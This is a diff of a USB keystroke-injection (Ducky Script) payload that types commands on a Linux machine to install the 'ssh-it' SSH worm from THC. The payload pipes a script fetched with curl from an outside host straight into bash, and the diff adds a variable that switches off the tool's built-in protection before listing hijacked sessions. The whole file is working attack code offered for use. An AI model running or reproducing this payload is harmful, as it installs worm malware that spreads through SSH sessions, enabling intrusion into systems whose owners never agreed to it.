@@ -1,5 +1,5 @@
 REM    Linux SSH worm (ssh-it) from THC
-REM    Version 1.0
+REM    Version 1.1
 REM    OS: Pop!_OS Linux 18.04 (Ubuntu based distrib)
 REM    Author: Jiab77
 
@@ -19,10 +19,15 @@ DELAY 1000
 STRING # Download and install the ssh worm
 ENTER
 DELAY 2000
-STRING bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+REM Removing protection as recommended by Skyper from THC
+REM Only required during the ssh-it testing phase
+STRING THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ENTER
 DELAY 10000
 STRING source ~/.prng/seed
+ENTER
+DELAY 500
+STRING ~/.prng/thc_cli -h
 ENTER
 DELAY 500
 STRING ~/.prng/thc_cli -r list
